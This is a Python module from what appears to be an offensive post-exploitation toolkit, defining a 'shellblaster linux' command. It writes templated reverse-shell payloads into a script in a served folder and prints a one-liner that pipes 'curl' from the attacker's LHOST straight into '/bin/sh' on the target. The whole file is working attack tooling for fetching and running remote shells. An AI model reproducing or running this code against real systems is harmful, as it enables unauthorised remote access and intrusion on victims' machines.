import logging as logger
from os import linesep

from colorama import Fore

from pssutil.fileutils import generate_random_filename

TAG = f"[{Fore.LIGHTYELLOW_EX}ShellBlaster{Fore.RESET}]"


def add_cmd(pm, cmd):
    shellblaster_handler = cmd.add(["shellblaster"])
    shellblaster_handler.add(["linux"], lambda args: shellblaster_linux_sh(pm, args), ["/bin/sh"])


def shellblaster_linux_sh(pm, args):
    shellbin_old = None

    if len(args) > 0 and not pm.cvars.SHELLBIN == args[0]:
        shellbin_old = pm.cvars.SHELLBIN
        pm.cvars.SHELLBIN = args[0]

    tmpfile = generate_random_filename(pm.cfg.tmpfolder, ".sh")

    with open(tmpfile, "w+") as file:
        for shell in pm.cfg.shells:
            file.write(shell.fill(pm.cvars) + linesep)

    logger.info(f"{TAG} curl -sSL http://{pm.cvars.LHOST}/{tmpfile.relative_to(pm.cfg.serve_folder)} | {pm.cvars.SHELLBIN}")

    if shellbin_old:
        pm.cvars.SHELLBIN = shellbin_old
